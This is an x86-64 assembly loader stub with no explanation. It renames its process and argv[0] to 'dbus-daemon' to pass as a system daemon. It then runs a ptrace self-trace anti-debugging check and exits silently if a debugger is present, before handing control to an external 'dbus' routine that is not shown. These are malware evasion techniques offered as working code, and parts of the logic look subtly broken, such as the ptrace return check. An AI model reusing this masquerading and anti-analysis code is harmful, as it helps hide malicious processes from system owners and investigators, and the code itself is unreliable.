bits 64

extern dbus
extern __libc_start_main

global exit_force

global _start

section .data
    fake_name db "dbus-daemon",0
    len_fake equ $-fake_name

section .text

write:
    mov rax, 1
    mov rdi, rdi
    mov rsi, rsi
    mov rdx, rdx
    syscall
    ret

exit_force:
    mov rax, 60
    mov rdi, rdi
    syscall
    ret

_start:
    mov r14, rdx
    mov r12, [rsp]
    lea r13, [rsp+8]

    jmp copy_name

copy_name:
    mov rax, 157
    mov rdi, 0xF
    lea rsi, [rel fake_name]
    xor rdx, rdx
    xor r10, r10
    xor r8, r8
    syscall

    mov rbx, [r13]
    lea rsi, [rel fake_name]
    mov rdi, rbx
    mov rcx, len_fake
    cld
    rep movsb
    
    mov byte [rdi], 0

    mov rdi, r12
    mov rsi, r13

    call trace_redirect

trace_redirect:
    mov rax, 101
    xor rdi, rdi
    xor rsi, rsi
    mov rdx, 1
    xor r10, r10
    syscall

    cmp rax, -1
    jne no_debug

    mov rax, 60
    mov rdi, 0
    syscall

no_debug:
    mov  rdi, dbus
    mov  rsi, r12
    mov  rdx, r13
    xor  rcx, rcx
    xor  r8, r8
    mov  r9,r14
    mov  rax, rsp
    push rax

    call __libc_start_main wrt ..plt
    
    mov rax, 60
    mov rdi, 0
    syscall